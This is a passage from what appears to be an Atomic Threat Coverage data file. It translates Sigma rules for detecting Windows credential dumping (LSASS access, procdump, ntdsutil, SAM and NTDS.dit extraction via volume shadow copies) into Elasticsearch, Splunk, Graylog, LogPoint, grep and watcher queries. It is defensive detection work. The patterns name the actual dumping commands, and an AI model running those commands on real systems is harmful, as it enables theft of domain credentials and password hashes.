(ProcessName.keyword:(*\\\\\\\\\\\\\\\\wmiprvse.exe OR *\\\\\\\\\\\\\\\\taskmgr.exe OR *\\\\\\\\\\\\\\\\procexp64.exe OR *\\\\\\\\\\\\\\\\procexp.exe OR *\\\\\\\\\\\\\\\\lsm.exe OR *\\\\\\\\\\\\\\\\csrss.exe OR *\\\\\\\\\\\\\\\\wininit.exe OR *\\\\\\\\\\\\\\\\vmtoolsd.exe)))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((EventID:\\\\\"4656\\\\\" AND ObjectName.keyword:*\\\\\\\\\\\\\\\\lsass.exe AND AccessMask.keyword:(*0x40* OR *0x1400* OR *0x1000* OR *0x100000* OR *0x1410* OR *0x1010* OR *0x1438* OR *0x143a* OR *0x1418* OR *0x1f0fff* OR *0x1f1fff* OR *0x1f2fff* OR *0x1f3fff*)) OR ((EventID:\\\\\"4663\\\\\" AND ObjectName.keyword:*\\\\\\\\\\\\\\\\lsass.exe AND AccessList.keyword:(*4484* OR *4416*)) AND (NOT (ProcessName.keyword:(*\\\\\\\\\\\\\\\\wmiprvse.exe OR *\\\\\\\\\\\\\\\\taskmgr.exe OR *\\\\\\\\\\\\\\\\procexp64.exe OR *\\\\\\\\\\\\\\\\procexp.exe OR *\\\\\\\\\\\\\\\\lsm.exe OR *\\\\\\\\\\\\\\\\csrss.exe OR *\\\\\\\\\\\\\\\\wininit.exe OR *\\\\\\\\\\\\\\\\vmtoolsd.exe)))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Generic Password Dumper Activity on LSASS\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((EventID:\"4656\" AND ObjectName.keyword:*\\\\\\\\lsass.exe AND AccessMask.keyword:(*0x40* *0x1400* *0x1000* *0x100000* *0x1410* *0x1010* *0x1438* *0x143a* *0x1418* *0x1f0fff* *0x1f1fff* *0x1f2fff* *0x1f3fff*)) OR ((EventID:\"4663\" AND ObjectName.keyword:*\\\\\\\\lsass.exe AND AccessList.keyword:(*4484* *4416*)) AND (NOT (ProcessName.keyword:(*\\\\\\\\wmiprvse.exe *\\\\\\\\taskmgr.exe *\\\\\\\\procexp64.exe *\\\\\\\\procexp.exe *\\\\\\\\lsm.exe *\\\\\\\\csrss.exe *\\\\\\\\wininit.exe *\\\\\\\\vmtoolsd.exe)))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4656\" ObjectName=\"*\\\\\\\\lsass.exe\" (AccessMask=\"*0x40*\" OR AccessMask=\"*0x1400*\" OR AccessMask=\"*0x1000*\" OR AccessMask=\"*0x100000*\" OR AccessMask=\"*0x1410*\" OR AccessMask=\"*0x1010*\" OR AccessMask=\"*0x1438*\" OR AccessMask=\"*0x143a*\" OR AccessMask=\"*0x1418*\" OR AccessMask=\"*0x1f0fff*\" OR AccessMask=\"*0x1f1fff*\" OR AccessMask=\"*0x1f2fff*\" OR AccessMask=\"*0x1f3fff*\")) OR ((EventID=\"4663\" ObjectName=\"*\\\\\\\\lsass.exe\" (AccessList=\"*4484*\" OR AccessList=\"*4416*\")) NOT ((ProcessName=\"*\\\\\\\\wmiprvse.exe\" OR ProcessName=\"*\\\\\\\\taskmgr.exe\" OR ProcessName=\"*\\\\\\\\procexp64.exe\" OR ProcessName=\"*\\\\\\\\procexp.exe\" OR ProcessName=\"*\\\\\\\\lsm.exe\" OR ProcessName=\"*\\\\\\\\csrss.exe\" OR ProcessName=\"*\\\\\\\\wininit.exe\" OR ProcessName=\"*\\\\\\\\vmtoolsd.exe\"))))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" ((event_id=\"4656\" ObjectName=\"*\\\\\\\\lsass.exe\" AccessMask IN [\"*0x40*\", \"*0x1400*\", \"*0x1000*\", \"*0x100000*\", \"*0x1410*\", \"*0x1010*\", \"*0x1438*\", \"*0x143a*\", \"*0x1418*\", \"*0x1f0fff*\", \"*0x1f1fff*\", \"*0x1f2fff*\", \"*0x1f3fff*\"]) OR ((event_id=\"4663\" ObjectName=\"*\\\\\\\\lsass.exe\" AccessList IN [\"*4484*\", \"*4416*\"])  -(ProcessName IN [\"*\\\\\\\\wmiprvse.exe\", \"*\\\\\\\\taskmgr.exe\", \"*\\\\\\\\procexp64.exe\", \"*\\\\\\\\procexp.exe\", \"*\\\\\\\\lsm.exe\", \"*\\\\\\\\csrss.exe\", \"*\\\\\\\\wininit.exe\", \"*\\\\\\\\vmtoolsd.exe\"]))))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*4656)(?=.*.*\\\\lsass\\\\.exe)(?=.*(?:.*.*0x40.*|.*.*0x1400.*|.*.*0x1000.*|.*.*0x100000.*|.*.*0x1410.*|.*.*0x1010.*|.*.*0x1438.*|.*.*0x143a.*|.*.*0x1418.*|.*.*0x1f0fff.*|.*.*0x1f1fff.*|.*.*0x1f2fff.*|.*.*0x1f3fff.*)))|.*(?:.*(?=.*(?:.*(?=.*4663)(?=.*.*\\\\lsass\\\\.exe)(?=.*(?:.*.*4484.*|.*.*4416.*))))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\wmiprvse\\\\.exe|.*.*\\\\taskmgr\\\\.exe|.*.*\\\\procexp64\\\\.exe|.*.*\\\\procexp\\\\.exe|.*.*\\\\lsm\\\\.exe|.*.*\\\\csrss\\\\.exe|.*.*\\\\wininit\\\\.exe|.*.*\\\\vmtoolsd\\\\.exe))))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\nid: 2afafd61-6aae-4df4-baed-139fa1f4c345\ndescription: Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)\nstatus: experimental\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm\nauthor: Thomas Patzke\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '*\\ntdsutil*'\n    condition: selection\nfalsepositives:\n    - NTDS maintenance\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\nid: 2afafd61-6aae-4df4-baed-139fa1f4c345\ndescription: Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)\nstatus: experimental\nreferences:\n    - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/ntdsutil.htm\nauthor: Thomas Patzke\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '*\\ntdsutil*'\n    condition: selection\nfalsepositives:\n    - NTDS maintenance\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:*\\\\\\\\ntdsutil*", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Invocation-of-Active-Directory-Diagnostic-Tool-ntdsutil.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\",\\n    \"description\": \"Detects execution of ntdsutil.exe, which can be used for various attacks against the NTDS database (NTDS.DIT)\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"CommandLine.keyword:*\\\\\\\\\\\\\\\\ntdsutil*\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:*\\\\\\\\\\\\\\\\ntdsutil*\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Invocation of Active Directory Diagnostic Tool (ntdsutil.exe)\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:*\\\\\\\\ntdsutil*", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "CommandLine=\"*\\\\\\\\ntdsutil*\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*\\\\\\\\ntdsutil*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*\\\\ntdsutil.*'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Use of Procdump\nid: 5afee48e-67dd-4e03-a783-f74259dcf998\ndescription: Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we're also able to catch cases in which the attacker has renamed the procdump executable.\nstatus: experimental\nreferences:\n    - Internal Research\nauthor: Florian Roth\ndate: 2018/10/30\nmodified: 2019/10/14\ntags:\n    - attack.defense_evasion\n    - attack.t1036\n    - attack.credential_access\n    - attack.t1003\n    - car.2013-05-009\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine:\n            - '* -ma *'\n    selection2:\n        CommandLine:\n            - '* lsass*'\n    selection3:\n        CommandLine:\n            - '* -ma ls*'\n    condition: ( selection1 and selection2 ) or selection3\nfalsepositives:\n    - Unlikely, because no one should dump an lsass process memory\n    - Another tool that uses the command line switches of Procdump\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Use of Procdump\nid: 5afee48e-67dd-4e03-a783-f74259dcf998\ndescription: Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we're also able to catch cases in which the attacker has renamed the procdump executable.\nstatus: experimental\nreferences:\n    - Internal Research\nauthor: Florian Roth\ndate: 2018/10/30\nmodified: 2019/10/14\ntags:\n    - attack.defense_evasion\n    - attack.t1036\n    - attack.credential_access\n    - attack.t1003\n    - car.2013-05-009\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine:\n            - '* -ma *'\n    selection2:\n        CommandLine:\n            - '* lsass*'\n    selection3:\n        CommandLine:\n            - '* -ma ls*'\n    condition: ( selection1 and selection2 ) or selection3\nfalsepositives:\n    - Unlikely, because no one should dump an lsass process memory\n    - Another tool that uses the command line switches of Procdump\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((CommandLine.keyword:(*\\\\ \\\\-ma\\\\ *) AND CommandLine.keyword:(*\\\\ lsass*)) OR CommandLine.keyword:(*\\\\ \\\\-ma\\\\ ls*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Use-of-Procdump <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Use of Procdump\",\\n    \"description\": \"Detects suspicious uses of the SysInternals Procdump utility by using a special command line parameter in combination with the lsass.exe process. This way we\\'re also able to catch cases in which the attacker has renamed the procdump executable.\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\",\\n      \"attack.credential_access\",\\n      \"attack.t1003\",\\n      \"car.2013-05-009\"\\n    ],\\n    \"query\": \"((CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-ma\\\\\\\\ *) AND CommandLine.keyword:(*\\\\\\\\ lsass*)) OR CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-ma\\\\\\\\ ls*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-ma\\\\\\\\ *) AND CommandLine.keyword:(*\\\\\\\\ lsass*)) OR CommandLine.keyword:(*\\\\\\\\ \\\\\\\\-ma\\\\\\\\ ls*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Use of Procdump\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((CommandLine.keyword:(* \\\\-ma *) AND CommandLine.keyword:(* lsass*)) OR CommandLine.keyword:(* \\\\-ma ls*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((CommandLine=\"* -ma *\") (CommandLine=\"* lsass*\")) OR (CommandLine=\"* -ma ls*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((event_id=\"1\" CommandLine IN [\"* -ma *\"] CommandLine IN [\"* lsass*\"]) OR CommandLine IN [\"* -ma ls*\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*(?:.*.* -ma .*))(?=.*(?:.*.* lsass.*)))|.*(?:.*.* -ma ls.*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: SAM Dump to AppData\nid: 839dd1e8-eda8-4834-8145-01beeee33acd\nstatus: experimental\ndescription: Detects suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers\ntags:\n    - attack.credential_access\n    - attack.t1003\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: system\n    definition: The source of this type of event is Kernel-General\ndetection:\n    selection:\n        EventID: 16\n    keywords:\n        Message:\n            - '*\\AppData\\Local\\Temp\\SAM-*.dmp *'\n    condition: all of them\nfalsepositives:\n    - Penetration testing\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: SAM Dump to AppData\nid: 839dd1e8-eda8-4834-8145-01beeee33acd\nstatus: experimental\ndescription: Detects suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers\ntags:\n    - attack.credential_access\n    - attack.t1003\nauthor: Florian Roth\nlogsource:\n    product: windows\n    service: system\n    definition: The source of this type of event is Kernel-General\ndetection:\n    selection:\n        EventID: 16\n    keywords:\n        Message:\n            - '*\\AppData\\Local\\Temp\\SAM-*.dmp *'\n    condition: all of them\nfalsepositives:\n    - Penetration testing\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"16\" AND Message.keyword:(*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM\\\\-*.dmp\\\\ *))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/SAM-Dump-to-AppData <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"SAM Dump to AppData\",\\n    \"description\": \"Detects suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"16\\\\\" AND Message.keyword:(*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\SAM\\\\\\\\-*.dmp\\\\\\\\ *))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"16\\\\\" AND Message.keyword:(*\\\\\\\\\\\\\\\\AppData\\\\\\\\\\\\\\\\Local\\\\\\\\\\\\\\\\Temp\\\\\\\\\\\\\\\\SAM\\\\\\\\-*.dmp\\\\\\\\ *))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'SAM Dump to AppData\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"16\" AND Message.keyword:(*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM\\\\-*.dmp *))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"16\" (Message=\"*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM-*.dmp *\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"16\" Message IN [\"*\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Temp\\\\\\\\SAM-*.dmp *\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*16)(?=.*(?:.*.*\\\\AppData\\\\Local\\\\Temp\\\\SAM-.*\\\\.dmp .*)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious SYSVOL Domain Group Policy Access\nid: 05f3c945-dcc8-4393-9f3d-af65077a8f86\nstatus: experimental\ndescription: Detects Access to Domain Group Policies stored in SYSVOL\nreferences:\n    - https://adsecurity.org/?p=2288\n    - https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100\nauthor: Markus Neis\ndate: 2018/04/09\nmodified: 2018/12/11\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '*\\SYSVOL\\\\*\\policies\\\\*'\n    condition: selection\nfalsepositives:\n    - administrative activity\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious SYSVOL Domain Group Policy Access\nid: 05f3c945-dcc8-4393-9f3d-af65077a8f86\nstatus: experimental\ndescription: Detects Access to Domain Group Policies stored in SYSVOL\nreferences:\n    - https://adsecurity.org/?p=2288\n    - https://www.hybrid-analysis.com/sample/f2943f5e45befa52fb12748ca7171d30096e1d4fc3c365561497c618341299d5?environmentId=100\nauthor: Markus Neis\ndate: 2018/04/09\nmodified: 2018/12/11\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine: '*\\SYSVOL\\\\*\\policies\\\\*'\n    condition: selection\nfalsepositives:\n    - administrative activity\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:*\\\\\\\\SYSVOL\\\\\\\\*\\\\\\\\policies\\\\\\\\*", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-SYSVOL-Domain-Group-Policy-Access <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious SYSVOL Domain Group Policy Access\",\\n    \"description\": \"Detects Access to Domain Group Policies stored in SYSVOL\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"CommandLine.keyword:*\\\\\\\\\\\\\\\\SYSVOL\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\policies\\\\\\\\\\\\\\\\*\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"CommandLine.keyword:*\\\\\\\\\\\\\\\\SYSVOL\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\policies\\\\\\\\\\\\\\\\*\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious SYSVOL Domain Group Policy Access\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "CommandLine.keyword:*\\\\\\\\SYSVOL\\\\\\\\*\\\\\\\\policies\\\\\\\\*", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "CommandLine=\"*\\\\\\\\SYSVOL\\\\\\\\*\\\\\\\\policies\\\\\\\\*\"", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" CommandLine=\"*\\\\\\\\SYSVOL\\\\\\\\*\\\\\\\\policies\\\\\\\\*\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^.*\\\\SYSVOL\\\\\\\\.*\\\\policies\\\\\\\\.*'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Activity Related to NTDS.dit Domain Hash Retrieval\nid: b932b60f-fdda-4d53-8eda-a170c1d97bbd\nstatus: experimental\ndescription: Detects suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely\nauthor: Florian Roth, Michael Haag\nreferences:\n    - https://www.swordshield.com/2015/07/getting-hashes-from-ntds-dit-file/\n    - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n    - https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)/\n    - https://securingtomorrow.mcafee.com/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/\n    - https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - vssadmin.exe Delete Shadows\n            - 'vssadmin create shadow /for=C:'\n            - copy \\\\?\\GLOBALROOT\\Device\\\\*\\windows\\ntds\\ntds.dit\n            - copy \\\\?\\GLOBALROOT\\Device\\\\*\\config\\SAM\n            - 'vssadmin delete shadows /for=C:'\n            - 'reg SAVE HKLM\\SYSTEM '\n            - esentutl.exe /y /vss *\\ntds.dit*\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Activity Related to NTDS.dit Domain Hash Retrieval\nid: b932b60f-fdda-4d53-8eda-a170c1d97bbd\nstatus: experimental\ndescription: Detects suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely\nauthor: Florian Roth, Michael Haag\nreferences:\n    - https://www.swordshield.com/2015/07/getting-hashes-from-ntds-dit-file/\n    - https://room362.com/post/2013/2013-06-10-volume-shadow-copy-ntdsdit-domain-hashes-remotely-part-1/\n    - https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-(VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM)/\n    - https://securingtomorrow.mcafee.com/mcafee-labs/new-teslacrypt-ransomware-arrives-via-spam/\n    - https://dfironthemountain.wordpress.com/2018/12/06/locked-file-access-using-esentutl-exe/\ntags:\n    - attack.credential_access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine:\n            - vssadmin.exe Delete Shadows\n            - 'vssadmin create shadow /for=C:'\n            - copy \\\\?\\GLOBALROOT\\Device\\\\*\\windows\\ntds\\ntds.dit\n            - copy \\\\?\\GLOBALROOT\\Device\\\\*\\config\\SAM\n            - 'vssadmin delete shadows /for=C:'\n            - 'reg SAVE HKLM\\SYSTEM '\n            - esentutl.exe /y /vss *\\ntds.dit*\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "CommandLine.keyword:(vssadmin.exe\\\\ Delete\\\\ Shadows OR vssadmin\\\\ create\\\\ shadow\\\\ \\\\/for\\\\=C\\\\: OR copy\\\\ \\\\\\\\?\\\\\\\\GLOBALROOT\\\\\\\\Device\\\\\\\\*\\\\\\\\windows\\\\\\\\ntds\\\\\\\\ntds.dit OR copy\\\\ \\\\\\\\?\\\\\\\\GLOBALROOT\\\\\\\\Device\\\\\\\\*\\\\\\\\config\\\\\\\\SAM OR vssadmin\\\\ delete\\\\ shadows\\\\ \\\\/for\\\\=C\\\\: OR reg\\\\ SAVE\\\\ HKLM\\\\\\\\SYSTEM\\\\  OR esentutl.exe\\\\ \\\\/y\\\\ \\\\/vss\\\\ *\\\\\\\\ntds.dit*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Activity-Related-to-NTDS.dit-Domain-Hash-Retrieval <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Activity Related to NTDS.dit Domain Hash Retrieval\",\\n    \"description\": \"Detects suspicious commands that could be related to activity that uses volume shadow copy to steal and retrieve hashes from the NTDS.dit file remotely\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1003\"\\n    ],\\n    \"query\": \"CommandLine.keyword:(vssadmin.exe\\\\\\\\ Delete\\\\\\\\ Shadows OR vssadmin\\\\\\\\ 